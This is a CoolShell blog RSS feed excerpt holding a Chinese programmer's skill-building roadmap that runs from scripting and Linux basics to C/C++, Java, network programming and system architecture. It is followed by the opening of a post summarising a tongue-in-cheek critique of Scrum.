<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
<channel>
<title>酷 壳 – CoolShell</title>
<description>享受编程和技术所带来的快乐 – Coding Your Ambition</description>
<link>https://coolshell.cn</link>
<pubDate>2021-11-26T11:41:56+08:00</pubDate>
<!-- other elements omitted from this example -->
<item>
<title><![CDATA[ 程序员技术练级攻略 ]]></title>
<link>https://coolshell.cn/articles/4990.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" ><strong><span style="color: #cc0000; font-size: 16pt;">注：该文最新的版本在这里</span>《<a style="font-size: 16pt;" href="https://coolshell.cn/articles/18360.html">程序员技术练级攻略（2018版）</a>》<span style="color: #cc0000; font-size: 16pt;">（需要付费阅读）</span></strong></p>
<p>月光博客6月12日发表了《<a href="http://www.williamlong.info/archives/2700.html" target="_blank" rel="noopener">写给新手程序员的一封信</a>》，翻译自《<a href="http://blog.akash.im/an-open-letter-to-those-who-want-to-start" target="_blank" rel="noopener">An open letter to those who want to start programming</a>》，我的朋友（他在本站的id是<a href="https://coolshell.cn/?author=3" target="_blank" rel="noopener">Mailper</a>）告诉我，他希望在酷壳上看到一篇更具操作性的文章。因为他也是喜欢编程和技术的家伙，于是，我让他把他的一些学习Python和Web编程的一些点滴总结一下。于是他给我发来了一些他的心得和经历，我在把他的心得做了不多的增改，并根据我的经历增加了“进阶”一节。<strong>这是一篇由新手和我这个老家伙根据我们的经历完成的文章</strong>。</p>
<p>我的这个朋友把这篇文章取名叫Build Your Programming Technical Skills，我实在不知道用中文怎么翻译，但我在写的过程中，<strong>我觉得这很像一个打网游做任务升级的一个过程，所以取名叫“技术练级攻略”，题目有点大，呵呵，这个标题纯粹是为了好玩</strong>。<strong>这里仅仅是在分享Mailper和我个人的学习经历。</strong>（注：省去了我作为一个初学者曾经学习过的一些技术(今天明显过时了)，如：Delphi/Power builder，也省去了我学过的一些我觉得没意思的技术Lotus Notes/ActiveX/COM/ADO/ATL/.NET ……）</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%89%8D%E8%A8%80" title="前言">前言</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%90%AF%E8%92%99%E5%85%A5%E9%97%A8" title="启蒙入门">启蒙入门</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E8%BF%9B%E9%98%B6%E5%8A%A0%E6%B7%B1" title="进阶加深">进阶加深</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E9%AB%98%E7%BA%A7%E6%B7%B1%E5%85%A5" title="高级深入">高级深入</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%89%8D%E8%A8%80"></span>前言<span class="ez-toc-section-end"></span>
</h4>
<p>你是否觉得自己从学校毕业的时候只做过小玩具一样的程序？<wbr></wbr>走入职场后哪怕没有什么经验也可以把以下这些课外练习走一遍（朋友的抱怨：学校课程总是从理论出发，<wbr></wbr>作业项目都看不出有什么实际作用，不如从工作中的需求出发）</p>
<p>建议：</p>
<ul>
<li>不要乱买书，不要乱追新技术新名词，<wbr></wbr>基础的东西经过很长时间积累而且还会在未来至少10年通用。</li>
<li>回顾一下历史，看看历史上时间线上技术的发展，你才能明白明天会是什么样。</li>
<li>一定要动手，例子不管多么简单，<wbr></wbr>建议至少自己手敲一遍看看是否理解了里头的细枝末节。</li>
<li>一定要学会思考，思考为什么要这样，而不是那样。还要举一反三地思考。</li>
</ul>
<p><strong>注</strong>：你也许会很奇怪为什么下面的东西很偏Unix/Linux，这是因为我觉得Windows下的编程可能会在未来很没有前途，原因如下：</p>
<p><span id="more-4990"></span></p>
<ul>
<li>现在的用户界面几乎被两个东西主宰了，1）Web，2）移动设备iOS或Android。Windows的图形界面不吃香了。</li>
<li>越来越多的企业在用成本低性能高的Linux和各种开源技术来构架其系统，Windows的成本太高了。</li>
<li>微软的东西变得太快了，很不持久，他们完全是在玩弄程序员。详情参见《<a title="Windows编程革命简史" href="https://coolshell.cn/articles/3008.html" target="_blank" rel="noopener">Windows编程革命史</a>》</li>
</ul>
<p>所以，我个人认为以后的趋势是前端是Web+移动，后端是Linux+开源。开发这边基本上没Windows什么事。</p>
<h4>
<span class="ez-toc-section" id="%E5%90%AF%E8%92%99%E5%85%A5%E9%97%A8"></span>启蒙入门<span class="ez-toc-section-end"></span>
</h4>
<p><strong>1、 学习一门脚本语言，例如Python/Ruby</strong></p>
<p>可以让你摆脱对底层语言的恐惧感，脚本语言可以让你很快开发出能用得上的小程序。实践项目:</p>
<ul>
<li>处理文本文件，或者csv (关键词 python csv, python open, python sys) 读一个本地文件，逐行处理（例如 word count，或者处理log）</li>
<li>遍历本地文件系统 (sys, os, path)，例如写一个程序统计一个目录下所有文件大小并按各种条件排序并保存结果</li>
<li>跟数据库打交道 (python sqlite)，写一个小脚本统计数据库里条目数量</li>
<li>学会用各种print之类简单粗暴的方式进行调试</li>
<li>学会用Google (phrase, domain, use reader to follow tech blogs)</li>
</ul>
<p>为什么要学脚本语言，因为他们实在是太方便了，很多时候我们需要写点小工具或是脚本来帮我们解决问题，你就会发现正规的编程语言太难用了。</p>
<p><strong>2、 用熟一种程序员的编辑器(不是IDE) 和一些基本工具</strong></p>
<ul>
<li>Vim / Emacs / Notepad++，学会如何配置代码补全，外观，外部命令等。</li>
<li>Source Insight (或 ctag)</li>
</ul>
<p>使用这些东西不是为了Cool，而是这些编辑器在查看、修改代码/配置文章/日志会更快更有效率。</p>
<p><strong>3、 熟悉Unix/Linux Shell和常见的命令行</strong></p>
<ul>
<li>如果你用windows，至少学会用虚拟机里的linux， vmware player是免费的，装个Ubuntu吧</li>
<li>一定要少用少用图形界面。</li>
<li>学会使用man来查看帮助</li>
<li>文件系统结构和基本操作 ls/chmod/chown/rm/find/ln/cat/mount/mkdir/tar/gzip …</li>
<li>学会使用一些文本操作命令 sed/awk/grep/tail/less/more …</li>
<li>学会使用一些管理命令 ps/top/lsof/netstat/kill/tcpdump/iptables/dd…</li>
<li>了解/etc目录下的各种配置文章，学会查看/var/log下的系统日志，以及/proc下的系统运行信息</li>
<li>了解正则表达式，使用正则表达式来查找文件。</li>
</ul>
<p>对于程序员来说Unix/Linux比Windows简单多了。（参看我四年前CSDN的博文《<a href="http://blog.csdn.net/haoel/article/details/1533720" target="_blank" rel="noopener">其实Unix很简单</a>》）学会使用Unix/Linux你会发现图形界面在某些时候实在是太难用了，相当地相当地降低工作效率。</p>
<p><strong>4、 学习Web基础（HTML/CSS/JS) + 服务器端技术 (LAMP)</strong></p>
<p>未来必然是Web的世界，学习WEB基础的最佳网站是<a href="http://www.w3school.com.cn/" target="_blank" rel="noopener">W3School</a>。</p>
<ul>
<li>学习HTML基本语法</li>
<li>学习CSS如何选中HTML元素并应用一些基本样式（关键词：box model）</li>
<li>学会用  Firefox + Firebug 或 chrome 查看你觉得很炫的网页结构，并动态修改。</li>
<li>学习使用Javascript操纵HTML元件。理解DOM和动态网页（<a href="https://oreilly.com/catalog/9780596527402" target="_blank" rel="noopener">http://oreilly.com/catalog/9780596527402</a>) 网上有免费的章节，足够用了。或参看 <a href="http://www.w3school.com.cn/htmldom/index.asp" target="_blank" rel="noopener">DOM</a> 。</li>
<li>学会用  Firefox + Firebug 或 chrome 调试Javascript代码（设置断点，查看变量，性能，控制台等）</li>
<li>在一台机器上配置<a href="www.apache.org" target="_blank" rel="noopener">Apache </a>或 <a href="nginx.net" target="_blank" rel="noopener">Nginx</a>
</li>
<li>学习<a href="www.php.net" target="_blank" rel="noopener">PHP</a>，让后台PHP和前台HTML进行数据交互，对服务器相应浏览器请求形成初步认识。实现一个表单提交和反显的功能。</li>
<li>把PHP连接本地或者远程数据库 MySQL（MySQL 和 SQL现学现用够了）</li>
<li>跟完一个名校的网络编程课程（例如：<a href="http://www.stanford.edu/~ouster/cgi-bin/cs142-fall10/index.php" target="_blank" rel="noopener">http://www.stanford.edu/~ouster/cgi-bin/cs142-fall10/index.php</a> ) 不要觉得需要多于一学期时间，大学生是全职一学期选3-5门课，你业余时间一定可以跟上</li>
<li>学习一个javascript库（例如jQuery 或 ExtJS）+  Ajax (异步读入一个服务器端图片或者数据库内容）+JSON数据格式。</li>
<li>HTTP: The Definitive Guide 读完前4章你就明白你每天上网用浏览器的时候发生的事情了(proxy, gateway, browsers)</li>
<li>做个小网站（例如：一个小的留言板，支持用户登录，Cookie/Session，增、删、改、查，上传图片附件，分页显示）</li>
<li>买个域名，租个空间，做个自己的网站。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E8%BF%9B%E9%98%B6%E5%8A%A0%E6%B7%B1"></span>进阶加深<span class="ez-toc-section-end"></span>
</h4>
<p><strong>1、 C语言和操作系统调用</strong></p>
<ul>
<li>重新学C语言，理解指针和内存模型，用C语言实现一下各种经典的算法和数据结构。推荐《<a href="http://product.china-pub.com/197050">计算机程序设计艺术</a>》、《<a href="http://product.china-pub.com/31701" target="_blank" rel="noopener">算法导论</a>》和《<a href="http://product.china-pub.com/209243" target="_blank" rel="noopener">编程珠玑</a>》。</li>
<li>学习<a title="（麻省理工免费课程）计算机科学和编程导论" href="https://coolshell.cn/articles/3723.html" target="_blank" rel="noopener">（麻省理工免费课程）计算机科学和编程导论</a>
</li>
<li>学习<a title="（麻省理工免费课程）C语言内存管理和C++面向对象编程" href="https://coolshell.cn/articles/2474.html" target="_blank" rel="noopener">（麻省理工免费课程）C语言内存管理</a>
</li>
<li>学习Unix/Linux系统调用（<a href="http://product.china-pub.com/30181" target="_blank" rel="noopener">Unix高级环境编程</a>），，了解系统层面的东西。
<ul>
<li>用这些系统知识操作一下文件系统，用户（实现一个可以拷贝目录树的小程序）</li>
<li>用fork/wait/waitpid写一个多进程的程序，用pthread写一个多线程带同步或互斥的程序。多进程多进程购票的程序。</li>
<li>用signal/kill/raise/alarm/pause/sigprocmask实现一个多进程间的信号量通信的程序。</li>
<li>学会使用gcc和gdb来编程和调试程序（参看我的《<a href="blog.csdn.net/haoel/article/details/2879" target="_blank" rel="noopener">用gdb调试程序</a>》）</li>
<li>学会使用makefile来编译程序。（参看我的《<a href="blog.csdn.net/haoel/article/details/2886" target="_blank" rel="noopener">跟我一起写makefile</a>》）</li>
<li>IPC和Socket的东西可以放到高级中来实践。</li>
</ul>
</li>
<li>学习Windows SDK编程（<a href="http://product.china-pub.com/52880" target="_blank" rel="noopener">Windows 程序设计 </a>，<a href="http://product.china-pub.com/3804" target="_blank" rel="noopener">MFC程序设计</a>）
<ul>
<li>写一个窗口，了解WinMain/WinProcedure，以及Windows的消息机制。</li>
<li>写一些程序来操作Windows SDK中的资源文件或是各种图形控件，以及作图的编程。</li>
<li>学习如何使用MSDN查看相关的SDK函数，各种WM_消息以及一些例程。</li>
<li>这本书中有很多例程，在实践中请不要照抄，试着自己写一个自己的例程。</li>
<li>不用太多于精通这些东西，因为GUI正在被Web取代，主要是了解一下Windows 图形界面的编程。@<a title="virushuo" href="https://twitter.com/#!/virushuo" data-user-id="49913">virushuo</a> 说：“ 我觉得GUI确实不那么热门了，但充分理解GUI工作原理是很重要的。包括移动设备开发，如果没有基础知识仍然很吃力。或者说移动设备开发必须理解GUI工作，或者在win那边学，或者在mac/iOS上学”。</li>
</ul>
</li>
</ul>
<p><strong>2、学习Java</strong></p>
<ul>
<li>Java 的学习主要是看经典的Core Java 《<a href="http://product.china-pub.com/208978" target="_blank" rel="noopener">Java 核心技术编程</a>》和《<a href="http://product.china-pub.com/34838" target="_blank" rel="noopener">Java编程思想</a>》（有两卷，我仅链了第一卷，足够了，因为Java的图形界面了解就可以了）</li>
<li>学习JDK，学会查阅Java API Doc <a href="https://download.oracle.com/javase/6/docs/api/">http://download.oracle.com/javase/6/docs/api/</a>
</li>
<li>了解一下Java这种虚拟机语言和C和Python语言在编译和执行上的差别。从C、Java、Python思考一下“跨平台”这种技术。</li>
<li>学会使用IDE Eclipse，使用Eclipse 编译，调试和开发Java程序。</li>
<li>建一个Tomcat的网站，尝试一下JSP/Servlet/JDBC/MySQL的Web开发。把前面所说的那个PHP的小项目试着用JSP和Servlet实现一下。</li>
</ul>
<div><strong>3、Web的安全与架构</strong></div>
<div>
<ul>
<li>学习HTML5，网上有很多很多教程，以前<a href="https://coolshell.cn" target="_blank" rel="noopener">酷壳</a>也介绍过很多，我在这里就不罗列了。</li>
<li>学习Web开发的安全问题（参考<a title="新浪微博的XSS攻击" href="https://coolshell.cn/articles/4914.html" target="_blank" rel="noopener">新浪微博被攻击的这个事</a>，以及<a href="http://guides.rubyonrails.org/security.html" target="_blank" rel="noopener">Ruby的这篇文章</a>）</li>
<li>学习HTTP Server的rewrite机制，Nginx的反向代理机制，<a href="https://en.wikipedia.org/wiki/Fast_CGI" target="_blank" rel="noopener">fast-cgi</a>（如：<a href="http://php-fpm.org/" target="_blank" rel="noopener">PHP-FPM</a>）</li>
<li>学习Web的静态页面缓存技术。</li>
<li>学习Web的异步工作流处理，数据Cache，数据分区，负载均衡，水平扩展的构架。</li>
<li>
<strong>实践任务：</strong>
<ul>
<li>使用HTML5的canvas 制作一些Web动画。</li>
<li>尝试在前面开发过的那个Web应用中进行SQL注入，JS注入，以及XSS攻击。</li>
<li>把前面开发过的那个Web应用改成构造在Nginx + PHP-FPM + 静态页面缓存的网站</li>
</ul>
</li>
</ul>
</div>
<p><strong>4、学习关系型数据库</strong></p>
<ul>
<li>你可以安装MSSQLServer或MySQL来学习数据库。</li>
<li>学习教科书里数据库设计的那几个范式，1NF，2NF，3NF，……</li>
<li>学习数据库的存过，触发器，视图，建索引，游标等。</li>
<li>学习SQL语句，明白表连接的各种概念（参看《<a title="图解SQL的Join" href="https://coolshell.cn/articles/3463.html">SQL  Join的图示</a>》）</li>
<li>学习如何优化数据库查询（参看《<a title="MySQL性能优化的最佳20+条经验" href="https://coolshell.cn/articles/1846.html">MySQL的优化</a>》）</li>
<li>
<strong>实践任务</strong>：设计一个论坛的数据库，至少满足3NF，使用SQL语句查询本周，本月的最新文章，评论最多的文章，最活跃用户。</li>
</ul>
<p><strong>5、一些开发工具</strong></p>
<ul>
<li>学会使用SVN或Git来管理程序版本。</li>
<li>学会使用JUnit来对Java进行单元测试。</li>
<li>学习C语言和Java语言的coding standard 或 coding guideline。（我N年前写过一篇关C语言非常简单的文章——《<a href="http://blog.csdn.net/haoel/article/category/9200/2" target="_blank" rel="noopener">编程修养</a>》，这样的东西你可以上网查一下，一大堆）。</li>
<li>推荐阅读《<a href="http://product.china-pub.com/28351" target="_blank" rel="noopener">代码大全</a>》《<a href="http://product.china-pub.com/196374" target="_blank" rel="noopener">重构</a>》《<a href="http://product.china-pub.com/196266" target="_blank" rel="noopener">代码整洁之道</a>》</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E9%AB%98%E7%BA%A7%E6%B7%B1%E5%85%A5"></span>高级深入<span class="ez-toc-section-end"></span>
</h4>
<p><strong>1、C++ / Java 和面向对象</strong></p>
<p>我个人以为学好C++，Java也就是举手之劳。但是C++的学习曲线相当的陡。不过，我觉得C++是最需要学好的语言了。参看两篇趣文“<a title="C++ 程序员自信心曲线图" href="https://coolshell.cn/articles/2287.html" target="_blank" rel="noopener">C++学习信心图</a>” 和“<a title="“21天教你学会C++”" href="https://coolshell.cn/articles/2250.html" target="_blank" rel="noopener">21天学好C++</a>”</p>
<ul>
<li>学习<a title="（麻省理工免费课程）C语言内存管理和C++面向对象编程" href="https://coolshell.cn/articles/2474.html" target="_blank" rel="noopener">（麻省理工免费课程）C++面向对象编程</a>
</li>
<li>读我的 “<a title="如何学好C++语言" href="https://coolshell.cn/articles/4119.html" target="_blank" rel="noopener">如何学好C++</a>”中所推荐的那些书至少两遍以上（如果你对C++的理解能够深入到像我所写的《<a title="C++ 虚函数表解析" href="https://coolshell.cn/articles/12165.html" target="_blank" rel="noopener">C++虚函数表解析</a>》或是《<a title="C++ 对象的内存布局" href="https://coolshell.cn/articles/12176.html" target="_blank" rel="noopener">C++对象内存存局</a>》，或是《<a title="C/C++返回内部静态成员的陷阱" href="https://coolshell.cn/articles/12192.html" target="_blank" rel="noopener">C/C++返回内部静态成员的陷阱</a>》那就非常不错了）</li>
<li>然后反思为什么C++要干成这样，Java则不是？你一定要学会对比C++和Java的不同。比如，Java中的初始化，垃圾回收，接口，异常，虚函数，等等。</li>
<li>
<strong>实践任务：</strong>
<ul>
<li>用C++实现一个BigInt，支持128位的整形的加减乘除的操作。</li>
<li>用C++封装一个数据结构的容量，比如hash table。</li>
<li>用C++封装并实现一个智能指针（一定要使用模板）。</li>
</ul>
</li>
<li>《<a href="http://product.china-pub.com/25961" target="_blank" rel="noopener">设计模式</a>》必需一读，两遍以上，思考一下，这23个模式的应用场景。主要是两点：1）钟爱组合而不是继承，2）钟爱接口而不是实现。（也推荐《<a href="http://product.china-pub.com/27862">深入浅出设计模式</a>》）</li>
<li>
<strong>实践任务：</strong>
<ul>
<li>使用工厂模式实现一个内存池。</li>
<li>使用策略模式制做一个类其可以把文本文件进行左对齐，右对齐和中对齐。</li>
<li>使用命令模式实现一个命令行计算器，并支持undo和redo。</li>
<li>使用修饰模式实现一个酒店的房间价格订价策略——旺季，服务，VIP、旅行团、等影响价格的因素。</li>
</ul>
</li>
<li>学习STL的用法和其设计概念  – 容器，算法，迭代器，函数子。如果可能，请读一下其源码。</li>
<li>
<strong>实践任务：</strong>尝试使用面向对象、STL，设计模式、和WindowsSDK图形编程的各种技能
<ul>
<li>做一个贪吃蛇或是俄罗斯方块的游戏。支持不同的级别和难度。</li>
<li>做一个文件浏览器，可以浏览目录下的文件，并可以对不同的文件有不同的操作，文本文件可以打开编辑，执行文件则执行之，mp3或avi文件可以播放，图片文件可以展示图片。</li>
</ul>
</li>
<li>学习C++的一些类库的设计，如： MFC（看看候捷老师的《<a href="http://product.china-pub.com/3565" target="_blank" rel="noopener">深入浅出MFC</a>》） ，Boost, ACE,  CPPUnit，STL （STL可能会太难了，但是如果你能了解其中的设计模式和设计那就太好了，如果你能深入到我写的《<a href="http://blog.csdn.net/haoel/article/details/24058" target="_blank" rel="noopener">STL string类的写时拷贝技术</a>》那就非常不错了，ACE需要很强在的系统知识，参见后面的“加强对系统的了解”）</li>
<li>Java是真正的面向对象的语言，Java的设计模式多得不能再多，也是用来学习面向对象的设计模式的最佳语言了（参看<a title="JDK里的设计模式" href="https://coolshell.cn/articles/3320.html" target="_blank" rel="noopener">Java中的设计模式</a>）。</li>
<li>推荐阅读《<a href="http://product.china-pub.com/195040">Effective Java</a>》 and 《<a href="http://product.china-pub.com/197212">Java解惑</a>》</li>
<li>学习Java的框架，Java的框架也是多，如Spring, Hibernate，Struts 等等，主要是学习Java的设计，如IoC等。</li>
<li>Java的技术也是烂多，重点学习J2EE架构以及JMS， RMI, 等消息传递和远程调用的技术。</li>
<li>学习使用Java做Web Service （<a href="https://download.oracle.com/docs/cd/E17802_01/webservices/webservices/docs/2.0/tutorial/doc/" target="_blank" rel="noopener">官方教程在这里</a>）</li>
<li>
<strong>实践任务： </strong>尝试在Spring或Hibernate框架下构建一个有网络的Web Service的远程调用程序，并可以在两个Service中通过JMS传递消息。</li>
</ul>
<p>C++和Java都不是能在短时间内能学好的，C++玩是的深，Java玩的是广，我建议两者选一个。我个人的学习经历是：</p>
<ul>
<li>深究C++（我深究C/C++了十来年了）</li>
<li>学习Java的各种设计模式。</li>
</ul>
<p><strong>2、加强系统了解</strong></p>
<p>重要阅读下面的几本书：</p>
<ul>
<li>《<a href="http://product.china-pub.com/197413" target="_blank" rel="noopener">Unix编程艺术</a>》了解Unix系统领域中的设计和开发哲学、思想文化体系、原则与经验。你一定会有一种醍醐灌顶的感觉。</li>
<li>《<a href="http://product.china-pub.com/196770" target="_blank" rel="noopener">Unix网络编程卷1，套接字</a>》这是一本看完你就明白网络编程的书。重要注意TCP、UDP，以及多路复用的系统调用select/poll/epoll的差别。</li>
<li>《<a href="http://product.china-pub.com/35" target="_blank" rel="noopener">TCP/IP详解 卷1:协议</a>》- 这是一本看完后你就可以当网络黑客的书。了解以太网的的运作原理，了解TCP/IP的协议，运作原理以及如何TCP的调优。</li>
<li>
<strong>实践任务：</strong>
<ul>
<li>理解什么是阻塞（同步IO），非阻塞（异步IO），多路复用（select, poll, epoll）的IO技术。</li>
<li>写一个网络聊天程序，有聊天服务器和多个聊天客户端（服务端用UDP对部分或所有的的聊天客户端进Multicast或Broadcast）。</li>
<li>写一个简易的HTTP服务器。</li>
</ul>
</li>
<li>《<a href="http://product.china-pub.com/196859" target="_blank" rel="noopener">Unix网络编程卷2，进程间通信</a>》信号量，管道，共享内存，消息等各种IPC…… 这些技术好像有点老掉牙了，不过还是值得了解。</li>
<li>
<strong>实践任务：</strong>
<ul>
<li>主要实践各种IPC进程序通信的方法。</li>
<li>尝试写一个管道程序，父子进程通过管道交换数据。</li>
<li>尝试写一个共享内存的程序，两个进程通过共享内存交换一个C的结构体数组。</li>
</ul>
</li>
<li>学习《<a href="http://product.china-pub.com/209058" target="_blank" rel="noopener">Windows核心编程</a>》一书。把CreateProcess，Windows线程、线程调度、线程同步（Event,  信号量，互斥量）、异步I/O，内存管理，DLL，这几大块搞精通。</li>
<li>
<strong>实践任务：</strong>使用CreateProcess启动一个记事本或IE，并监控该程序的运行。把前面写过的那个简易的HTTP服务用线程池实现一下。写一个DLL的钩子程序监控指定窗口的关闭事件，或是记录某个窗口的按键。</li>
<li>有了多线程、多进程通信，TCP/IP，套接字，C++和设计模式的基本，你可以研究一下ACE了。使用ACE重写上述的聊天程序和HTTP服务器（带线程池）</li>
<li>
<strong>实践任务：</strong>通过以上的所有知识，尝试
<ul>
<li>写一个服务端给客户端传大文件，要求把100M的带宽用到80%以上。（注意，磁盘I/O和网络I/O可能会很有问题，想一想怎么解决，另外，请注意网络传输最大单元MTU）</li>
<li>了解BT下载的工作原理，用多进程的方式模拟BT下载的原理。</li>
</ul>
</li>
</ul>
<p><strong>3、系统架构</strong></p>
<ul>
<li>负载均衡。HASH式的，纯动态式的。（可以到Google学术里搜一些<a href="https://scholar.google.com.hk/scholar?q=%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1&amp;hl=zh-CN&amp;as_sdt=0&amp;as_vis=1&amp;oi=scholart" target="_blank" rel="noopener">关于负载均衡的文章</a>读读）</li>
<li>多层分布式系统 – 客户端服务结点层、计算结点层、数据cache层，数据层。J2EE是经典的多层结构。</li>
<li>
<a href="https://en.wikipedia.org/wiki/Content_delivery_network" target="_blank" rel="noopener">CDN系统</a> – 就近访问，内容边缘化。</li>
<li>
<a href="https://en.wikipedia.org/wiki/Peer-to-peer" target="_blank" rel="noopener">P2P式系统</a>，研究一下BT和电驴的算法。比如：<a href="https://en.wikipedia.org/wiki/Distributed_hash_table" target="_blank" rel="noopener">DHT算法</a>。</li>
<li>服务器备份，双机备份系统（Live-Standby和Live-Live系统），两台机器如何通过心跳监测对方？集群主结点备份。</li>
<li>
<a href="https://en.wikipedia.org/wiki/Virtualization" target="_blank" rel="noopener">虚拟化技术</a>，使用这个技术，可以把操作系统当应用程序一下切换或重新配置和部署。</li>
<li>学习<a href="https://thrift.apache.org/" target="_blank" rel="noopener">Thrift</a>，二进制的高性能的通讯中间件，支持数据(对象)序列化和多种类型的RPC服务。</li>
<li>学习<a href="https://hadoop.apache.org/" target="_blank" rel="noopener">Hadoop</a>。Hadoop框架中最核心的设计就是：MapReduce和HDFS。MapReduce的思想是由Google的一篇论文所提及而被广为流传的，简单的一句话解释MapReduce就是“任务的分解与结果的汇总”。HDFS是Hadoop分布式文件系统（Hadoop Distributed File System）的缩写，为分布式计算存储提供了底层支持。</li>
<li>了解<a href="https://en.wikipedia.org/wiki/NoSQL" target="_blank" rel="noopener">NoSQL数据库</a>（有人说可能是一个<a title="那些炒作过度的技术和概念" href="https://coolshell.cn/articles/3609.html" target="_blank" rel="noopener">过渡炒作的技术</a>），不过因为超大规模以及高并发的纯动态型网站日渐成为主流，而SNS类网站在数据存取过程中有着实时性等刚性需求，这使得目前NoSQL数据库慢慢成了人们所关注的焦点，并大有成为取代关系型数据库而成为未来主流数据存储模式的趋势。当前NoSQL数据库很多，大部分都是开源的，其中比较知名的有：MemcacheDB、Redis、Tokyo Cabinet(升级版为Kyoto Cabinet)、Flare、MongoDB、CouchDB、Cassandra、Voldemort等。</li>
</ul>
<p>写了那么多，回顾一下，觉得自己相当的有成就感。希望大家不要吓着，我自己这十来年也在不断地学习，今天我也在学习中，人生本来就是一个不断学习和练级的过程。<strong>不过，一定有漏的，也有不对的，还希望大家补充和更正</strong>。（<span style="color: #cc0000;"><strong>我会根据大家的反馈随时更新此文</strong></span>）欢迎大家通过我的微博（<a href="https://weibo.com/haoel" target="_blank" rel="noopener">@左耳朵耗子</a>）和twitter（@<a href="https://twitter.com/haoel" target="_blank" rel="noopener">haoel</a>）和我交流。</p>
<p><em><strong>—– 更新  2011/07/19 —–</strong></em></p>
<p>1）有朋友奇怪为什么我在这篇文章开头说了web+移动，却没有在后面提到iOS/Android的前端开发。因为我心里有一种感觉，移动设备上的UI最终也会被Javascript取代。大家可以用iPhone或Android看看google+，你就会明白了。</p>
<p>2）有朋友说我这里的东西太多了，不能为了学习而学习，我非常同意。我在文章的前面也说了要思考。另外，千万不要以为我说的这些东西是一些新的技术，这份攻略里95%以上的全是基础。而且都是久经考验的基础技术。即是可以让你一通百通的技术，也是可以让你找到一份不错工作的技术。</p>
<p>3）有朋友说学这些东西学完都40了，还不如想想怎么去挣钱。我想告诉大家，一是我今年还没有40岁，二是学无止境啊，三是我不觉得挣钱有多难，难的是怎么让你值那么多钱？无论是打工还是创业，是什么东西让你自己的价值，让你公司的价值更值钱？别的地方我不敢说，对于互联网或IT公司来说，技术实力绝对是其中之一。</p>
<p>4）有朋友说技术都是工具，不应该如此痴迷这句话没有错，有时候我们需要更多的是抬起头来看看技术以外的事情，或者是说我们在作技术的时候不去思考为什么会有这个技术，为什么不是别的，问题不在于技术，问题在于我们死读书，读死书，成了技术的书呆子。</p>
<p>5） 对于NoSQL，最近比较火，但我对其有点保守，所以，我只是说了解就可以。对于Hadoop，我觉得其在分布式系统上有巨大的潜力，所以需要学习。 对于关系型数据库，的确是很重要的东西，这点是我的疏忽，在原文里补充。</p>
<p>（全文完）</p>
<hr>
<p><strong><span style="color: #cc0000; font-size: 16pt;">注：该文最新的版本在这里</span>《<a style="font-size: 16pt;" href="https://coolshell.cn/articles/18360.html">程序员技术练级攻略（2018版）</a>》<span style="color: #cc0000; font-size: 16pt;">（需要付费阅读）</span></strong></p>
 ]]></content>
<pubDate>2011-07-18T10:31:22+08:00</pubDate>
<guid>https://coolshell.cn/articles/4990.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 为什么Scrum不行？ ]]></title>
<link>https://coolshell.cn/articles/5044.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >这篇文章的原文在这里（<a title="Why Scrum will never work" href="https://maurits.wordpress.com/2011/07/13/why-scrum-will-never-work/" target="_blank" rel="noopener">原文链接</a>）（<strong>下文不是全译，也不是部分译，我只是把其总结，有我自己的发挥，但是原意大致不变</strong>），这篇文章完全是在调侃Scrum的，作者第一段就是一个免费声明，其说他是<a href="https://en.wikipedia.org/wiki/Scrum_(development)">Scrum</a>和其它敏捷方法的big fan， 他也认为Scrum 100% 对 软件开发可行。作者使用Scrum 5年了，也公开作过几次敏捷的分享会。他觉得写这篇文章只是为了好玩，因为他们戴上<a href="https://en.wikipedia.org/wiki/Edward_de_Bono">Edward de Bono</a> 的 <a href="https://en.wikipedia.org/wiki/Six_Thinking_Hats#Black_hat_.E2.80.93_Being_Cautious">black hat</a> （黑礼帽 – 是6个思考之帽中的一种——负面思考，思考事物的负面因素，这样才知道：它会起作用吗？缺点是什么？它有什么问题？为什么不能做。）</p>
<p>因为本人经常站在Agile的风口浪尖，所以我有必要也来一个“免责声明”。Shit！其实我想来的是“<strong>不免责声明</strong>” ——<strong>下文中的九大原因是对中国的各种Agile实践者咨询师不注重实际只重方法论的批判</strong>，<strong>本人必然要和那种只以流程方法论为中心的软件开发斗争到底</strong>。其实我没有那么嚣张，<strong><span style="color: #ff0000;">我只是想说，下面的这些东西相当的现实。</span><span style="color: #ff0000;">希望各种Scrum的实践者们认识到这些问题，从而可以让你们明白软件开发中的人的重要性</span></strong>。</p>
<p><strong>Reason 1</strong>:  <a href="https://en.wikipedia.org/wiki/Scrum_(development)">Scrum</a> 的基石是相信人。创造一个安全的环境，这样每个人都能相互学习，相互直言。但是，这是不行的，这世上有很多人并不关心这些，而且政治和竞争到处都是，办公室里无小事，你和别人交心，你相信他们，最终受伤的你自己。你真的以为那里有空间让你可以去犯错，去冒险吗？别天真了！你啊，too young, too simple, sometimes naive!</p>
